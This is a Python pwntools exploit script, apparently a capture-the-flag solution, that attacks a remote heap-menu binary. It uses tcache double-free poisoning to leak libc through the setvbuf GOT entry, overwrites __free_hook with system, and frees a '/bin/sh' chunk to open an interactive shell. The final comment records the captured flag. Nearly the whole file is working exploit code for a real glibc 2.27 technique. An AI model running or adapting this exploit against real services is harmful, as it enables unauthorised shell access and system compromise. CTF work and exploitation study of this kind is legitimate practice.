from pwn import *

elf = ELF("chall")
libc = ELF('libc-2.27.so')
r = remote('34.121.211.139', 4444)


def malloc(size, content):
    r.recvuntil('choice :')
    r.sendline('1')
    r.recvline()
    r.sendline(str(size))
    r.recvline()
    r.sendline(content)


def free():
    r.recvuntil('choice :')
    r.sendline('3')


def view():
    r.recvuntil('choice :')
    r.sendline('2')
    r.recvline()
    r.recvline()


# size 0x10 --> 16
with log.progress("leaking libc") as l:
    malloc(0x10, "A" * 16)
    free()
    free()
    malloc(0x10, p64(elf.got['setvbuf']))
    malloc(0x10, "C")
    malloc(0x10, "\n")

    view()
    leak = u64(r.recv(6).ljust(8, b'\x00'))
    l.status(hex(leak))
    libc_base = leak - libc.sym['exit']
    free_hook = libc_base + libc.sym['__free_hook']
    system = libc_base + libc.sym['system']
    l.success(hex(libc_base))

# size 0x30 --> 48
with log.progress("overwriting __free_hook") as l:
    malloc(0x30, "B")
    free()
    free()
    malloc(0x30, p64(free_hook))
    malloc(0x30, p64(0))
    malloc(0x30, p64(system))
    malloc(0x30, "/bin/sh\x00")
    l.success()
    free()
r.interactive()

# FLAG -->  shaktictf{u_4re_a_trU3_c0mr4de}
